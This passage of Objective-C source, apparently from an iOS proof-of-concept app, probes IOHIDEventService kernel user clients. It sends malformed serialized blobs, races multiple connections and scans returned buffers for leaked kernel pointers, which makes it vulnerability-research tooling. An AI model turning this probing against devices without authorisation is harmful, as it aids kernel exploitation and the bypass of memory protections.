    uint8_t prevMappedPreview[32] = {0};
    BOOL havePrevMappedPreview = NO;

    for (uint32_t iter = 0; iter < kCopyEventProbeIters; iter++) {
        // Use identical inputs each round so data instability is meaningful.
        uint64_t scalarsIn[2] = { 0, 1 /* no filter */ };

        // Snapshot mapped region BEFORE the call (read-only observation)
        if (preSnapshot) {
            memcpy(preSnapshot, (const void *)(uintptr_t)mappedAddr, probeLen);
        }

        // Provide a struct output buffer in case the framework
        // copies data back that way.
        uint8_t structOut[kEventOutputBufferSize];
        memset(structOut, 0xA5, sizeof(structOut));
        size_t structOutSize = sizeof(structOut);

        kern_return_t kr = sIOConnectCallMethod(
            connection,
            kSelectorCopyEvent,
            scalarsIn, 2,
            NULL, 0,                    // no struct input (filterMode=1)
            NULL, NULL,                 // no scalar output
            structOut, &structOutSize
        );

        const char *err = mach_error_string(kr);
        [self appendLog:[NSString stringWithFormat:@"copyEvent[%u] kr=0x%x (%s) structOutSize=%zu",
                         iter, kr, err ? err : "?", structOutSize]];

        // Treat a struct-output signal as meaningful only when non-zero bytes
        // appear or data is unstable across identical calls.
        if (structOutSize > 0) {
            size_t checkLen = MIN(structOutSize, sizeof(structOut));
            BOOL modified = [self bufferModified:structOut sentinel:0xA5 length:checkLen];
            if (modified) {
                size_t previewLen = MIN((size_t)32, checkLen);
                BOOL nonZero = [self bufferHasAnyNonZero:structOut length:checkLen];
                BOOL unstable = NO;
                if (havePrevStructPreview && previewLen > 0) {
                    unstable = (memcmp(prevStructPreview, structOut, previewLen) != 0);
                }
                if (previewLen > 0) {
                    memcpy(prevStructPreview, structOut, previewLen);
                    havePrevStructPreview = YES;
                }

                if (nonZero || unstable) {
                    if (outSawNonZeroStruct && nonZero) {
                        *outSawNonZeroStruct = YES;
                    }
                    [self appendLog:[NSString stringWithFormat:
                                     @"  SIGNAL: struct output non-zero/unstable (kr=0x%x, nonZero=%@, unstable=%@) preview: %@",
                                     kr, nonZero ? @"YES" : @"NO", unstable ? @"YES" : @"NO",
                                     [self hexPreview:structOut length:previewLen]]];
                } else {
                    [self appendLog:@"  NOTE: struct output changed but remained zero-filled; not counted as boundary signal."];
                }
            }
        }

        // Check mapped buffer for writes (read-only compare against snapshot)
        if (preSnapshot) {
            BOOL mappedChanged = (memcmp(preSnapshot, (const void *)(uintptr_t)mappedAddr, probeLen) != 0);
            if (mappedChanged) {
                const uint8_t *mapped = (const uint8_t *)(uintptr_t)mappedAddr;
                uint32_t eventSize = 0;
                if (probeLen >= 4) {
                    memcpy(&eventSize, mapped, sizeof(eventSize));
                }
                size_t previewLen = MIN((size_t)32, probeLen);
                BOOL nonZero = [self bufferHasAnyNonZero:mapped length:previewLen];
                BOOL unstable = NO;
                if (havePrevMappedPreview && previewLen > 0) {
                    unstable = (memcmp(prevMappedPreview, mapped, previewLen) != 0);
                }
                if (previewLen > 0) {
                    memcpy(prevMappedPreview, mapped, previewLen);
                    havePrevMappedPreview = YES;
                }

                if (nonZero || unstable) {
                    if (outSawMappedSignal) {
                        *outSawMappedSignal = YES;
                    }
                    [self appendLog:[NSString stringWithFormat:
                                     @"  SIGNAL: mapped buffer changed (kr=0x%x, eventSize=%u, nonZero=%@, unstable=%@) preview: %@",
                                     kr, eventSize, nonZero ? @"YES" : @"NO", unstable ? @"YES" : @"NO",
                                     [self hexPreview:mapped length:previewLen]]];
                    [self appendLog:[NSString stringWithFormat:@"  EVENT: %@",
                                     [self eventHeaderSummary:mapped length:probeLen]]];
                } else {
                    [self appendLog:@"  NOTE: mapped buffer changed but remained zero-filled; not counted as boundary signal."];
                }
            }
        }
    }

    free(preSnapshot);
}

// ---- Service open helper (iterates matching services) ----

- (kern_return_t)openFirstMatchingService:(NSString *)className
                           userClientType:(uint32_t)type
                               connection:(io_connect_t *)outConnection {
    *outConnection = MACH_PORT_NULL;
    // Prefer iterator path so we can test every instance even if the first one exists but rejects open.
    if (sIOServiceGetMatchingServices && sIOIteratorNext) {
        CFMutableDictionaryRef matching = sIOServiceMatching(className.UTF8String);
        if (!matching) return KERN_INVALID_ARGUMENT;

        io_iterator_t iter = 0;
        kern_return_t kr = sIOServiceGetMatchingServices(MACH_PORT_NULL, matching, &iter);
        if (kr != KERN_SUCCESS || !iter) return (kr == KERN_SUCCESS ? KERN_NOT_FOUND : kr);

        kern_return_t lastErr = KERN_NOT_FOUND;
        uint32_t triedCount = 0;
        io_service_t service = MACH_PORT_NULL;

        while ((service = sIOIteratorNext(iter)) != MACH_PORT_NULL) {
            io_connect_t conn = MACH_PORT_NULL;
            kr = sIOServiceOpen(service, mach_task_self_, type, &conn);
            sIOObjectRelease(service);
            triedCount++;

            if (kr == KERN_SUCCESS && conn != MACH_PORT_NULL) {
                *outConnection = conn;
                [self appendLog:[NSString stringWithFormat:@"  opened service instance #%u", triedCount]];
                sIOObjectRelease(iter);
                return KERN_SUCCESS;
            }

            lastErr = kr;
            [self appendLog:[NSString stringWithFormat:@"  service instance #%u: open failed 0x%x (%s)",
                             triedCount, kr, mach_error_string(kr)]];
        }

        sIOObjectRelease(iter);
        [self appendLog:[NSString stringWithFormat:@"  tried %u instances, none opened.", triedCount]];
        return lastErr;
    }

    // Fallback path if iterator symbols are unavailable.
    CFMutableDictionaryRef matching = sIOServiceMatching(className.UTF8String);
    if (!matching) return KERN_INVALID_ARGUMENT;
    io_service_t service = sIOServiceGetMatchingService(MACH_PORT_NULL, matching);
    if (service == MACH_PORT_NULL) return KERN_NOT_FOUND;
    kern_return_t kr = sIOServiceOpen(service, mach_task_self_, type, outConnection);
    sIOObjectRelease(service);
    return kr;
}

// ---- Utility ----

- (NSString *)compactCFValue:(CFTypeRef)value {
    if (!value) return @"<absent>";
    CFTypeID tid = CFGetTypeID(value);
    if (tid == CFBooleanGetTypeID()) {
        return CFBooleanGetValue((CFBooleanRef)value) ? @"true" : @"false";
    }
    if (tid == CFStringGetTypeID()) {
        return [NSString stringWithFormat:@"\"%@\"", (__bridge NSString *)value];
    }
    NSString *desc = CFBridgingRelease(CFCopyDescription(value));
    return desc ?: @"<unknown>";
}

- (NSString *)entitlementValueForKey:(NSString *)key {
    if (![self loadSecuritySymbols]) {
        return @"<security-unavailable>";
    }

    CFTypeRef task = sSecTaskCreateFromSelf(kCFAllocatorDefault);
    if (!task) {
        return @"<task-create-failed>";
    }

    CFErrorRef error = NULL;
    CFTypeRef value = sSecTaskCopyValueForEntitlement(task, (__bridge CFStringRef)key, &error);
    NSString *out = nil;
    if (value) {
        out = [self compactCFValue:value];
        CFRelease(value);
    } else if (error) {
        out = [NSString stringWithFormat:@"<error %@>", [self compactCFValue:error]];
        CFRelease(error);
    } else {
        out = @"<absent>";
    }

    CFRelease(task);
    return out;
}

- (void)appendEntitlementReport {
    [self appendLog:@"entitlements:"];
    NSArray<NSString *> *keys = @[
        @"application-identifier",
        @"com.apple.developer.team-identifier",
        @"com.apple.private.hid.client.event-dispatch",
        @"com.apple.private.hid.client.admin",
        @"com.apple.private.hid.manager.user-access-device"
    ];
    for (NSString *key in keys) {
        [self appendLog:[NSString stringWithFormat:@"  %@=%@", key, [self entitlementValueForKey:key]]];
    }
}

- (void)logKernReturn:(kern_return_t)kr label:(NSString *)label {
    const char *err = mach_error_string(kr);
    if (kr == KERN_SUCCESS) {
        [self appendLog:[NSString stringWithFormat:@"%@: SUCCESS (0x0)", label]];
    } else {
        [self appendLog:[NSString stringWithFormat:@"%@: 0x%x (%s)", label, kr, err ? err : "unknown"]];
    }
}

- (BOOL)bufferModified:(const uint8_t *)buf sentinel:(uint8_t)sentinel length:(size_t)len {
    for (size_t i = 0; i < len; i++) {
        if (buf[i] != sentinel) return YES;
    }
    return NO;
}

- (BOOL)bufferHasAnyNonZero:(const uint8_t *)buf length:(size_t)len {
    for (size_t i = 0; i < len; i++) {
        if (buf[i] != 0) return YES;
    }
    return NO;
}

- (uint32_t)readLE32:(const uint8_t *)buf length:(size_t)len offset:(size_t)off {
    if (!buf || off + sizeof(uint32_t) > len) return 0;
    uint32_t v = 0;
    memcpy(&v, buf + off, sizeof(v));
    return v;
}

- (uint64_t)readLE64:(const uint8_t *)buf length:(size_t)len offset:(size_t)off {
    if (!buf || off + sizeof(uint64_t) > len) return 0;
    uint64_t v = 0;
    memcpy(&v, buf + off, sizeof(v));
    return v;
}

- (NSString *)eventHeaderSummary:(const uint8_t *)buf length:(size_t)len {
    if (!buf || len < 16) return @"<short event>";

    uint32_t d0 = [self readLE32:buf length:len offset:0];
    uint32_t d1 = [self readLE32:buf length:len offset:4];
    uint32_t d2 = [self readLE32:buf length:len offset:8];
    uint32_t d3 = [self readLE32:buf length:len offset:12];
    uint32_t d7 = [self readLE32:buf length:len offset:28];
    uint64_t q4 = [self readLE64:buf length:len offset:4];

    return [NSString stringWithFormat:
            @"size=0x%x ts@+4=0x%llx d1=0x%x d2=0x%x d3=0x%x d7=0x%x",
            d0, (unsigned long long)q4, d1, d2, d3, d7];
}

- (NSString *)hexPreview:(const uint8_t *)bytes length:(size_t)length {
    if (!bytes || length == 0) return @"<empty>";
    NSMutableString *hex = [NSMutableString stringWithCapacity:length * 3];
    for (size_t i = 0; i < length; i++) {
        [hex appendFormat:@"%02x", bytes[i]];
        if (i + 1 < length) [hex appendString:@" "];
    }
    return hex;
}

- (void)appendLog:(NSString *)line {
    NSLog(@"[TestPOC] %@", line);
    if ([NSThread isMainThread]) {
        NSString *next = [self.logView.text stringByAppendingFormat:@"%@\n", line];
        self.logView.text = next;
        [self.logView scrollRangeToVisible:NSMakeRange(next.length, 0)];
    } else {
        dispatch_async(dispatch_get_main_queue(), ^{
            NSString *next = [self.logView.text stringByAppendingFormat:@"%@\n", line];
            self.logView.text = next;
            [self.logView scrollRangeToVisible:NSMakeRange(next.length, 0)];
        });
    }
}

- (void)clearLifecyclePocState {
    self.proofCrossClientEvents = 0;
    self.proofCrossClientChecks = 0;
    self.proofTerminationProbes = 0;
    self.proofTerminationOpenCycles = 0;
    self.proofCrossClientSignal = NO;
    self.proofTermRaceActive = NO;
    self.proofHashChanged = NO;
    self.proofKernelPointerPatterns = NO;
    self.proofKernelPointerLeak = NO;
    self.proofKernelPointerValue = 0;
    self.proofKernelPointerOffset = -1;
    self.proofKernelPointerSourceConn = -1;
    self.proofKernelPointerHex = nil;
    self.proofPrimaryScanCount = 0;
    self.proofPrimaryLeakCount = 0;
    self.proofZoneFreePatternHits = 0;
    self.proofUninitLeaks = 0;
    self.proofReadAfterCloseLeaks = 0;
    self.proofRemapAfterFreeLeaks = 0;
    self.proofEntropyDelta = 0.0;
    self.proofFirstCrossClientConn = -1;
    self.proofFirstCrossClientEventSize = 0;
    self.proofFirstCrossClientHex = nil;
    self.proofArtifactPath = nil;
}

- (BOOL)isLikelyKernelPointerValue:(uint64_t)value {
    if (value == 0) return NO;
    uint32_t hi32 = (uint32_t)(value >> 32);
    // Check for common kernel address patterns:
    // 0xFFFFFE00_______: kernel text/data on arm64
    // 0xFFFFFE0________: alternative kernel range
    // 0xFFFFFF80_______: kernel stack/heap
    // 0xFFFFFF00_______: additional kernel range
    return hi32 == 0xFFFFFE00 ||
           (value >> 36) == 0xFFFFFE0 ||
           hi32 == 0xFFFFFF80 ||
           hi32 == 0xFFFFFF00 ||
           (value >= 0xFFFFFE0000000000ULL && value <= 0xFFFFFFFFFFFFFFFFULL);
}

// Aggressive kernel pointer scan across entire buffer with multiple alignments
- (NSArray<NSDictionary *> *)scanForKernelPointers:(const uint8_t *)base
                                           length:(size_t)length
                                     maxResults:(int)maxResults
                                     connIndex:(int)connIndex {
    NSMutableArray<NSDictionary *> *results = [NSMutableArray array];
    if (!base || length < 8) return results;

    // Scan at multiple alignments to catch unaligned pointers
    for (size_t align = 0; align < 8; align++) {
        for (size_t off = align; off + 8 <= length; off += 4) {  // 4-byte stride for thorough coverage
            uint64_t val = 0;
            memcpy(&val, base + off, sizeof(val));

            if ([self isLikelyKernelPointerValue:val]) {
                // Check if this might be part of a vtable or function pointer array
                BOOL inPointerArray = NO;
                if (off >= 8 && off + 16 <= length) {
                    uint64_t prev = 0, next = 0;
                    memcpy(&prev, base + off - 8, sizeof(prev));
                    memcpy(&next, base + off + 8, sizeof(next));
                    inPointerArray = [self isLikelyKernelPointerValue:prev] ||
                                    [self isLikelyKernelPointerValue:next];
                }

                NSDictionary *leak = @{
                    @"offset": @(off),
                    @"value": [NSString stringWithFormat:@"0x%016llx", val],
                    @"alignment": @(align),
                    @"connIndex": @(connIndex),
                    @"inArray": @(inPointerArray),
                    @"context": [self hexPreview:(base + (off >= 16 ? off - 16 : 0))
                                         length:MIN(48, length - (off >= 16 ? off - 16 : 0))]
                };
                [results addObject:leak];

                if (results.count >= maxResults) {
                    return results;
                }
            }
        }
    }

    return results;
}

- (void)appendPocArtifactEntry:(NSDictionary *)entry {
    if (!entry) {
        return;
    }

    NSString *artifactsDir = [NSTemporaryDirectory() stringByAppendingPathComponent:@"TestPOCProofs"];
    [[NSFileManager defaultManager] createDirectoryAtPath:artifactsDir
                               withIntermediateDirectories:YES
                                                attributes:nil
                                                     error:nil];

    struct timeval tv;
    gettimeofday(&tv, NULL);
    NSString *timestamp = [NSString stringWithFormat:@"%ld_%06ld", tv.tv_sec, (long)tv.tv_usec];
    uint32_t randSuffix = (uint32_t)arc4random();
    NSString *filePath = [artifactsDir stringByAppendingPathComponent:
                         [NSString stringWithFormat:@"lifecycle_poc_%@_%08x.json", timestamp, randSuffix]];

    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:entry
                                                       options:NSJSONWritingPrettyPrinted
                                                         error:nil];
    if (jsonData && [jsonData writeToFile:filePath atomically:YES]) {
        self.proofArtifactPath = filePath;
        [self appendLog:[NSString stringWithFormat:@"Proof artifact written: %@", filePath]];
    } else {
        [self appendLog:@"Proof artifact write failed."];
    }
}

// ========== DEEP BOUNDARY PROBES ==========

#pragma mark - Binary Blob Builder

/// Build a binary-format OSSerialize blob from an array of 32-bit words + optional trailing data.
/// Prepends the magic header with 0xD4 as the first byte.
- (NSData *)buildBinaryBlob:(const uint32_t *)words count:(uint32_t)wordCount
               trailingData:(const uint8_t *)trailing trailingLen:(size_t)trailingLen {
    // Magic: 0x000000D4 (little-endian: D4 00 00 00)
    uint32_t magic = 0x000000D4;
    NSMutableData *blob = [NSMutableData dataWithCapacity:(1 + wordCount) * 4 + trailingLen];
    [blob appendBytes:&magic length:4];
    if (words && wordCount > 0) {
        [blob appendBytes:words length:wordCount * sizeof(uint32_t)];
    }
    if (trailing && trailingLen > 0) {
        [blob appendBytes:trailing length:trailingLen];
    }
    return blob;
}

/// Open a fresh connection to an IOHIDEventService instance (type=2).
- (kern_return_t)openFreshConnection:(io_connect_t *)outConn {
    *outConn = MACH_PORT_NULL;
    if (!sIOServiceGetMatchingServices || !sIOIteratorNext) return KERN_NOT_SUPPORTED;

    CFMutableDictionaryRef matching = sIOServiceMatching("IOHIDEventService");
    if (!matching) return KERN_INVALID_ARGUMENT;

    io_iterator_t iter = MACH_PORT_NULL;
    kern_return_t kr = sIOServiceGetMatchingServices(MACH_PORT_NULL, matching, &iter);
    if (kr != KERN_SUCCESS || iter == MACH_PORT_NULL) return kr;

    io_service_t service = MACH_PORT_NULL;
    while ((service = sIOIteratorNext(iter)) != MACH_PORT_NULL) {
        io_connect_t conn = MACH_PORT_NULL;
        kr = sIOServiceOpen(service, mach_task_self_, 2, &conn);
        sIOObjectRelease(service);
        if (kr == KERN_SUCCESS && conn != MACH_PORT_NULL) {
            *outConn = conn;
            sIOObjectRelease(iter);
            return KERN_SUCCESS;
        }
    }
    sIOObjectRelease(iter);
    return KERN_NOT_FOUND;
}

/// Open multiple gated connections to the SAME IOHIDEventService provider.
/// Each IOServiceOpen creates a separate UserClient with its own IOCommandGate,
/// allowing concurrent entry from separate userclients (unless the provider itself
/// serializes internally via its own workloop/locks).
/// Returns the number of connections successfully opened and gated.
- (int)openMultipleGatedConnections:(io_connect_t *)outConns
                           maxCount:(int)maxCount
                         outService:(io_service_t *)outService {
    if (!sIOServiceGetMatchingServices || !sIOIteratorNext || maxCount <= 0) return 0;

    for (int i = 0; i < maxCount; i++) outConns[i] = MACH_PORT_NULL;
    if (outService) *outService = MACH_PORT_NULL;

    CFMutableDictionaryRef matching = sIOServiceMatching("IOHIDEventService");
    if (!matching) return 0;

    io_iterator_t iter = MACH_PORT_NULL;
    kern_return_t kr = sIOServiceGetMatchingServices(MACH_PORT_NULL, matching, &iter);
    if (kr != KERN_SUCCESS || iter == MACH_PORT_NULL) return 0;

    int opened = 0;
    io_service_t service = MACH_PORT_NULL;

    while ((service = sIOIteratorNext(iter)) != MACH_PORT_NULL) {
        // Try to open and gate a first connection to this service
        io_connect_t firstConn = MACH_PORT_NULL;
        kr = sIOServiceOpen(service, mach_task_self_, 2, &firstConn);
        if (kr != KERN_SUCCESS || firstConn == MACH_PORT_NULL) {
            sIOObjectRelease(service);
            continue;
        }

        // Gate it with selector 0 (open)
        uint64_t scalarIn = 0;
        const char *xml = kOpenPropertiesXML;
        kern_return_t gateKr = sIOConnectCallMethod(
            firstConn, kSelectorOpen,
            &scalarIn, 1,
            xml, strlen(xml) + 1,
            NULL, NULL, NULL, NULL);
        if (gateKr != KERN_SUCCESS) {
            sIOServiceClose(firstConn);
            sIOObjectRelease(service);
            continue;
        }

        outConns[0] = firstConn;
        opened = 1;
        [self appendLog:[NSString stringWithFormat:@"Multi-conn: connection 0 opened+gated (0x%x)", firstConn]];

        // Now open remaining connections to the SAME service
        for (int i = 1; i < maxCount; i++) {
            io_connect_t conn = MACH_PORT_NULL;
            kr = sIOServiceOpen(service, mach_task_self_, 2, &conn);
            if (kr != KERN_SUCCESS || conn == MACH_PORT_NULL) {
                [self appendLog:[NSString stringWithFormat:@"Multi-conn: connection %d open failed 0x%x", i, kr]];
                continue;
            }

            // Gate this connection too
            gateKr = sIOConnectCallMethod(
                conn, kSelectorOpen,
                &scalarIn, 1,
                xml, strlen(xml) + 1,
                NULL, NULL, NULL, NULL);
            if (gateKr != KERN_SUCCESS) {
                [self appendLog:[NSString stringWithFormat:@"Multi-conn: connection %d gate failed 0x%x", i, gateKr]];
                sIOServiceClose(conn);
                continue;
            }

            outConns[opened] = conn;
            opened++;
            if (opened <= 5 || i == maxCount - 1) {
                [self appendLog:[NSString stringWithFormat:@"Multi-conn: connection %d opened+gated (0x%x)", i, conn]];
            } else if (opened == 6) {
                [self appendLog:@"Multi-conn: (suppressing per-connection logs for remaining...)"];
            }
        }

        // Keep the service alive if the caller wants to use it later (e.g. for IOServiceOpen
        // in the termination-race thread). Otherwise release it as usual.
        if (outService) {
            *outService = service;
        } else {
            sIOObjectRelease(service);
        }
        break; // Found a working service, done
    }

    sIOObjectRelease(iter);
    [self appendLog:[NSString stringWithFormat:@"Multi-conn: %d/%d connections established to same provider", opened, maxCount]];
    return opened;
}

#pragma mark - Phase 1: Input Validation Probe (Binary Deserializer)

- (void)runBinaryFormatProbe:(io_connect_t)referenceConn {
    [self appendLog:@"\n====== Phase 1: Input Validation Probe (Binary Deserializer) ======"];

    // OSSerialize binary format constants
    static const uint32_t kOSSerializeEndCollection = 0x80000000;
    static const uint32_t kOSSerializeDictionary    = 0x01000000;
    static const uint32_t kOSSerializeArray          = 0x02000000;
    static const uint32_t kOSSerializeNumber         = 0x04000000;
    static const uint32_t kOSSerializeSymbol         = 0x08000000;
    static const uint32_t kOSSerializeString         = 0x09000000;
    static const uint32_t kOSSerializeData           = 0x0A000000;
    static const uint32_t kOSSerializeBoolean        = 0x0B000000;
    static const uint32_t kOSSerializeBackref        = 0x0C000000;
    (void)kOSSerializeArray; (void)kOSSerializeNumber;
    (void)kOSSerializeString; (void)kOSSerializeData;
    (void)kOSSerializeBackref;

    // Helper: padded symbol data (4-byte aligned, null terminated)
    // "FastPathHasEntitlement" = 22 chars + 1 null = 23, pad to 24
    const char sym1[] = "FastPathHasEntitlement\0\0"; // 24 bytes
    // "FastPathMotionEventEntitlement" = 30 chars + 1 null = 31, pad to 32
    const char sym2[] = "FastPathMotionEventEntitlement\0\0"; // 32 bytes

    // ---- Test 1: Valid binary dict (baseline) ----
    {
        // dict(2) + sym1(len=23) + bool(true) + sym2(len=30)|end + bool(true)|end
        uint32_t words[] = {
            kOSSerializeDictionary | 2,
            kOSSerializeSymbol | 23,
        };
        NSMutableData *blob = [[self buildBinaryBlob:words count:2 trailingData:NULL trailingLen:0] mutableCopy];
        [blob appendBytes:sym1 length:24]; // padded symbol
        uint32_t boolTrue = kOSSerializeBoolean | 1; // value=1 (true)
        [blob appendBytes:&boolTrue length:4];
        uint32_t sym2Header = kOSSerializeSymbol | 31; // len=31
        [blob appendBytes:&sym2Header length:4];
        [blob appendBytes:sym2 length:32]; // padded symbol
        uint32_t boolTrueEnd = kOSSerializeBoolean | kOSSerializeEndCollection | 1;
        [blob appendBytes:&boolTrueEnd length:4];
        [self runBinaryProbeTest:@"1: Valid binary dict" blob:blob connection:referenceConn];
    }

    // ---- Test 2: Empty binary dict (count=0) ----
    {
        uint32_t words[] = {
            kOSSerializeDictionary | kOSSerializeEndCollection | 0,
        };
        NSData *blob = [self buildBinaryBlob:words count:1 trailingData:NULL trailingLen:0];
        [self runBinaryProbeTest:@"2: Empty binary dict (count=0)" blob:blob connection:referenceConn];
    }

    // ---- Test 3: Dict with count=0xFFFFFF (large-value handling) ----
    {
        uint32_t words[] = {
            kOSSerializeDictionary | kOSSerializeEndCollection | 0x00FFFFFF,
        };
        NSData *blob = [self buildBinaryBlob:words count:1 trailingData:NULL trailingLen:0];
        [self runBinaryProbeTest:@"3: Dict count=0xFFFFFF (large-value)" blob:blob connection:referenceConn];
    }

    // ---- Test 4: Backref to index 0xFFFFFF (bounds validation) ----
    {
        uint32_t words[] = {
            kOSSerializeDictionary | 1,
            kOSSerializeSymbol | 4,
        };
        NSMutableData *blob = [[self buildBinaryBlob:words count:2 trailingData:NULL trailingLen:0] mutableCopy];
        const char key[] = "key\0"; // 4 bytes, already aligned
        [blob appendBytes:key length:4];
        uint32_t backref = kOSSerializeBackref | kOSSerializeEndCollection | 0x00FFFFFF;
        [blob appendBytes:&backref length:4];
        [self runBinaryProbeTest:@"4: Backref index=0xFFFFFF (bounds check)" blob:blob connection:referenceConn];
    }

    // ---- Test 5: Backref to index 0 (circular reference handling) ----
    {
        uint32_t words[] = {
            kOSSerializeDictionary | 1,
            kOSSerializeSymbol | 4,
        };
        NSMutableData *blob = [[self buildBinaryBlob:words count:2 trailingData:NULL trailingLen:0] mutableCopy];
        const char key[] = "key\0";
        [blob appendBytes:key length:4];
        uint32_t backref = kOSSerializeBackref | kOSSerializeEndCollection | 0;
        [blob appendBytes:&backref length:4];
        [self runBinaryProbeTest:@"5: Backref index=0 (self-ref)" blob:blob connection:referenceConn];
    }

    // ---- Test 6: Deeply nested dicts (recursion depth check) ----
    {
        NSMutableData *blob = [[self buildBinaryBlob:NULL count:0 trailingData:NULL trailingLen:0] mutableCopy];
        const char nestKey[] = "k\0\0\0"; // len=2, padded to 4
        for (int i = 0; i < 64; i++) {
            uint32_t dictHeader = kOSSerializeDictionary | 1;
            [blob appendBytes:&dictHeader length:4];
            uint32_t symHeader = kOSSerializeSymbol | 2;
            [blob appendBytes:&symHeader length:4];
            [blob appendBytes:nestKey length:4];
        }
        // Innermost value: bool true with end collection
        uint32_t boolEnd = kOSSerializeBoolean | kOSSerializeEndCollection | 1;
        [blob appendBytes:&boolEnd length:4];
        [self runBinaryProbeTest:@"6: 64 nested dicts (recursion depth)" blob:blob connection:referenceConn];
    }

    // ---- Test 7: String with length=0 ----
    {
        uint32_t words[] = {
            kOSSerializeDictionary | 1,
            kOSSerializeSymbol | 4,
        };
        NSMutableData *blob = [[self buildBinaryBlob:words count:2 trailingData:NULL trailingLen:0] mutableCopy];
        const char key[] = "key\0";
        [blob appendBytes:key length:4];
        uint32_t strHeader = kOSSerializeString | kOSSerializeEndCollection | 0;
        [blob appendBytes:&strHeader length:4];
        [self runBinaryProbeTest:@"7: String length=0" blob:blob connection:referenceConn];
    }

    // ---- Test 8: String with length=0xFFFFFF (oversized) ----
    {
        uint32_t words[] = {
            kOSSerializeDictionary | 1,
            kOSSerializeSymbol | 4,
        };
        NSMutableData *blob = [[self buildBinaryBlob:words count:2 trailingData:NULL trailingLen:0] mutableCopy];
        const char key[] = "key\0";
        [blob appendBytes:key length:4];
        uint32_t strHeader = kOSSerializeString | kOSSerializeEndCollection | 0x00FFFFFF;
        [blob appendBytes:&strHeader length:4];
        [self runBinaryProbeTest:@"8: String length=0xFFFFFF (oversize)" blob:blob connection:referenceConn];
    }

    // ---- Test 9: Number with wrong size (not 1/2/4/8) ----
    {
        uint32_t words[] = {
            kOSSerializeDictionary | 1,
            kOSSerializeSymbol | 4,
        };
        NSMutableData *blob = [[self buildBinaryBlob:words count:2 trailingData:NULL trailingLen:0] mutableCopy];
        const char key[] = "key\0";
        [blob appendBytes:key length:4];
        // Number with size=3 (invalid — should be 1, 2, 4, or 8 bytes)
        uint32_t numHeader = kOSSerializeNumber | kOSSerializeEndCollection | 3;
        [blob appendBytes:&numHeader length:4];
        uint32_t numData = 0x41414141;
        [blob appendBytes:&numData length:4]; // provide some data
        [self runBinaryProbeTest:@"9: Number size=3 (size validation)" blob:blob connection:referenceConn];
    }

    // ---- Test 10: Data blob with size exceeding remaining buffer ----
    {
        uint32_t words[] = {
            kOSSerializeDictionary | 1,
            kOSSerializeSymbol | 4,
        };
        NSMutableData *blob = [[self buildBinaryBlob:words count:2 trailingData:NULL trailingLen:0] mutableCopy];
        const char key[] = "key\0";
        [blob appendBytes:key length:4];
        // Data with size=256 but we only provide 4 bytes after this
        uint32_t dataHeader = kOSSerializeData | kOSSerializeEndCollection | 256;
        [blob appendBytes:&dataHeader length:4];
        uint32_t smallData = 0xDEADBEEF;
        [blob appendBytes:&smallData length:4];
        [self runBinaryProbeTest:@"10: Data size>buffer (bounds check)" blob:blob connection:referenceConn];
    }

    // ---- Test 11: Truncated mid-entry (only magic + 1 word) ----
    {
        uint32_t words[] = {
            kOSSerializeDictionary | 1,
        };
        NSData *blob = [self buildBinaryBlob:words count:1 trailingData:NULL trailingLen:0];
        [self runBinaryProbeTest:@"11: Truncated mid-entry" blob:blob connection:referenceConn];
    }

    // ---- Test 12: Valid dict but wrong key names ----
    {
        uint32_t words[] = {
            kOSSerializeDictionary | 2,
            kOSSerializeSymbol | 10,
        };
        NSMutableData *blob = [[self buildBinaryBlob:words count:2 trailingData:NULL trailingLen:0] mutableCopy];
        const char wrongKey1[] = "WrongKey1\0\0\0"; // 10 + pad to 12
        [blob appendBytes:wrongKey1 length:12];
        uint32_t boolTrue = kOSSerializeBoolean | 1;
        [blob appendBytes:&boolTrue length:4];
        uint32_t sym2Header = kOSSerializeSymbol | 10;
        [blob appendBytes:&sym2Header length:4];
        const char wrongKey2[] = "WrongKey2\0\0\0"; // 10 + pad to 12
        [blob appendBytes:wrongKey2 length:12];
        uint32_t boolTrueEnd = kOSSerializeBoolean | kOSSerializeEndCollection | 1;
        [blob appendBytes:&boolTrueEnd length:4];
        [self runBinaryProbeTest:@"12: Wrong key names (semantic)" blob:blob connection:referenceConn];
    }

    // ---- Test 13: Invalid type tag 0x7F ----
    {
        uint32_t words[] = {
            0x7F000000 | kOSSerializeEndCollection | 1,
        };
        NSData *blob = [self buildBinaryBlob:words count:1 trailingData:NULL trailingLen:0];
        [self runBinaryProbeTest:@"13: Type tag 0x7F (invalid)" blob:blob connection:referenceConn];
    }

    // ---- Test 14: Binary magic + XML content ----
    {
        // Magic header (0xD4) followed by XML text
        const char xmlAfterMagic[] = "<dict><key>FastPathHasEntitlement</key><true/></dict>";
        NSData *blob = [self buildBinaryBlob:NULL count:0
                                trailingData:(const uint8_t *)xmlAfterMagic
                                 trailingLen:strlen(xmlAfterMagic)];
        [self runBinaryProbeTest:@"14: Binary magic + XML (confusion)" blob:blob connection:referenceConn];
    }

    [self appendLog:@"====== Phase 1 Complete ======"];
}

/// Run a single binary probe test on an existing connection:
/// force a not-open state, send blob via selector 0, log, then close on success.
- (void)runBinaryProbeTest:(NSString *)name
                      blob:(NSData *)blob
                connection:(io_connect_t)connection {
    if (connection == MACH_PORT_NULL) {
        [self appendLog:[NSString stringWithFormat:@"[%@] SKIP: no active connection", name]];
        return;
    }

    // Ensure selector 0 probes run from a not-open state on the same instance.
    uint64_t closeScalar = 0;
    kern_return_t preCloseKr = sIOConnectCallMethod(
        connection, kSelectorClose,
        &closeScalar, 1, NULL, 0,
        NULL, NULL, NULL, NULL
    );
    if (preCloseKr != KERN_SUCCESS
        && preCloseKr != (kern_return_t)0xE00002BE /* kIOReturnNotOpen */
        && preCloseKr != (kern_return_t)0xE00002CD /* kIOReturnNotReady */)
    {
        [self appendLog:[NSString stringWithFormat:
                         @"[%@] pre-close: 0x%x (%s)",
                         name, preCloseKr, mach_error_string(preCloseKr)]];
    }

    uint64_t scalarIn = 0;
    kern_return_t kr = sIOConnectCallMethod(
        connection, kSelectorOpen,
        &scalarIn, 1,
        blob.bytes, blob.length,
        NULL, NULL, NULL, NULL
    );

    if (kr == (kern_return_t)0xE00002C5) { // kIOReturnExclusiveAccess / device already open
        [self appendLog:[NSString stringWithFormat:
                         @"[%@] kr=0x%x (%s) blobSize=%zu [PRECONDITION: busy/open, not parser outcome]",
                         name, kr, mach_error_string(kr), (size_t)blob.length]];
    } else {
        [self appendLog:[NSString stringWithFormat:@"[%@] kr=0x%x (%s) blobSize=%zu",
                         name, kr, mach_error_string(kr), (size_t)blob.length]];
    }

    // Log first 32 bytes of blob for reference
    size_t previewLen = MIN((size_t)32, (size_t)blob.length);
    [self appendLog:[NSString stringWithFormat:@"  blob: %@",
